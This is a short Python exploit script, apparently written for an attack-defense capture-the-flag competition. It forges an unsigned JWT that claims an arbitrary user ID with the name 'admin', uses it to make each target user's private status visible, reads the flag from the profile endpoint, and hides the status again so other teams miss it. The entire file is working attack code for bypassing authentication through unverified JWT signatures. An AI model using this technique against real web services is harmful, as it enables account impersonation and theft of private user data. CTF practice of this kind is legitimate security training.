import json

import requests
from base64 import b64encode
import sys


def exploit(team_ip, port, user_ids):
    baseurl = f"http://{team_ip}:{port}"
    for user_id in user_ids:
        profile_url = f"{baseurl}/profile/{user_id}"
        visibility_url = f"{baseurl}/profile/status/visbility/"
        fake_jwt_payload = {
            "user": {
                "userId": user_id,
                "displayname": "admin",
                "username": "admin"
            }
        }
        invalid_jwt = "a."+b64encode(json.dumps(fake_jwt_payload).encode()).decode()+".a"
        authorization_headers = {
            "Authorization": "Bearer "+invalid_jwt
        }

        # make the status visible
        resp = requests.post(visibility_url, headers=authorization_headers, json={"visibility": True})
        if resp.status_code != 200:
            print(f"Couldn't change status visibility of user with id {user_id}")
            continue

        resp = requests.get(profile_url)
        print(f"FLAG for user id {user_id}:", resp.json()["status"])

        # make the status invisible again so that others teams have to exploit this on their own
        resp = requests.post(visibility_url, headers=authorization_headers, json={"visibility": False})
        if resp.status_code != 200:
            print(f"Couldn't change status visibility of user with id {user_id}")
            continue


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python exploit.py <TEAM_IP> <PORT> [<FLAG_ID> ...]")
        sys.exit(-1)
    exploit(sys.argv[1], sys.argv[2], sys.argv[3:])